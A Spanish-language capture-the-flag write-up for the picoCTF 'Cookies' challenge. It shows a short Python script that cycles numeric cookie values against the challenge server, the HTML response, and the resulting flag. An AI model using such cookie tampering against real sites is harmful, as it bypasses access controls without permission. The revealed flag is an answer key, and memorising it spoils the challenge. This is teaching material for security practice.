## Descripción
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:29649/

## Pistas
- (None)

## Solución
- Para resolver este reto, tenemos que ingresar diferentes tipos de galletas para poder ingresar a la pestaña que podria ser donde esta la flag. Como no escribiremos nombres de galletas, veremos las cookies y nos daremos cuenta que las cookies en el apartado `value` son numeros reales, por lo que si los modificamos podremos ingresar a todas las pestañas.
- Despues de intentar con 5 numeros seguidos, nos dimos cuenta que es una perdida de tiempo buscarlas una por una. Por lo que haremos un ciclo for que recorra al menos 20 posiciones el valor de la cookie y filtrar la que en su pestaña se encuentre la flag con el formato `picoCTF`.

```python()
└─$ cat exploit.py    
import requests

url = "http://mercury.picoctf.net:29649/check"

for i in range(20):
        cookie ={"name":f"{i}"}
        r = requests.get(url, cookies=cookie)
        if "picoCTF" in r.text:
                print(r.text)
                              
```

- En este codigo vemos que se importa la llibreria  `requests` que nos ayudara a obtener los datos del sitio web. Tambien vemos el ciclo `for` que recorre la variable `i` 20 ciclos en busca de la cookle que tenga en su nombre "picoCTF".
- Vemos que como resultado nos da:

```HTML()
└─$ python3 exploit.py
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>

```

- Resumido, la flag seria:
```bash()
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}
```

## Notas adicionales
- `requests` es una librería Python que facilita enormemente el trabajo con peticiones HTTP. Antes o después, en algún proyecto, es posible que tengas que hacer peticiones web, ya sea para consumir un API, extraer información de una página o enviar el contenido de un formulario de manera automatizada. Si es así, Python `requests` es tu gran aliada.

## Referencias 
[Python requests](https://j2logo.com/python/python-requests-peticiones-http/)
